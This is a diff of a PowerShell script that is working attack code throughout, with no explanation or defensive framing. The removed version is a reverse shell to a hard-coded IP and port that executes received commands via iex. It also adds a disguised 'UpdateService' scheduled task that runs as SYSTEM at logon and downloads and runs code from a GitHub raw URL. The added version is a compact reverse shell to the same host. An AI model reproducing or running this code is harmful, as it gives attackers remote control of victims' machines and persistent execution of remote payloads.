@@ -1,30 +1,12 @@
-$attackerIP = "192.168.31.227"
-$attackerPort = 51234
-
-try {
-    $client = New-Object System.Net.Sockets.TCPClient($attackerIP, $attackerPort)
-    $stream = $client.GetStream()
-    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
-
-    $init = "Connected as $(whoami) on $(hostname)`nPS $(Get-Location)> "
-    $stream.Write(([System.Text.Encoding]::ASCII).GetBytes($init), 0, $init.Length)
-
-    while ($client.Connected) {
-        while (!$stream.DataAvailable -and $client.Connected) { 
-            Start-Sleep -Milliseconds 300 
-        }
-        $i = $stream.Read($bytes, 0, $bytes.Length)
-        if ($i -eq 0) { break }
-        
-        $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i)
-        $result = (iex $data 2>&1 | Out-String)
-        $result += "PS $(Get-Location)> "
-        $sendBytes = ([System.Text.Encoding]::ASCII).GetBytes($result)
-        $stream.Write($sendBytes, 0, $sendBytes.Length)
-    }
-    schtasks /create /tn "UpdateService" /tr "powershell -WindowStyle Hidden -Exec Bypass -c iex(iwr 'raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/code')" /sc onlogon /ru SYSTEM /f
-
-} catch {}
-finally {
-    if ($client) { $client.Close() }
-}
+$client = New-Object System.Net.Sockets.TCPClient('192.168.31.227',51234);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+$client.Close()
